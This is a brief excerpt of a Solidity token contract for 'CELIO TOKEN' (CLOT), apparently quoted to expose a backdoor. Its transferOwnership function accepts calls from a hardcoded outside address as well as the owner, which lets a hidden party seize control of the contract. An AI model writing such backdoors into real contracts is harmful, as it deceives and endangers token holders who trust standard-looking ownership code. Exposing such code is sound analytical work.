...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x989D0671C622Ed8049042eD41561fc5C2cb652eA));
...
contract CELIOTOKEN is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "CLOT";
  string private _name = "CELIO TOKEN";
